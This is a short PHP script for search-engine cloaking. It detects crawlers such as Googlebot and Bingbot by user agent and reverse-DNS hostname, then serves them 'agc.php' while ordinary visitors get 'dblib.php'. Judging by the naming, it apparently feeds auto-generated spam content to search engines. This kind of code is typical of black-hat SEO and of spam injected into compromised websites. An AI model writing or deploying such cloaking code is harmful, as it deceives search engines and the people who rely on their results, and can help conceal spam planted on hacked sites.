<?php
//$refer = $_SERVER['HTTP_REFERER'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
if(preg_match("/Googlebot|MJ12bot|msnbot|bingbot|yandexbot/i", $agent) || preg_match('/\.googlebot|google\.com|googlebot\.com|search\.msn\.com|msn\.com$/i', $host)) {
	include('agc.php');
}
else {
	include('dblib.php');
}
?>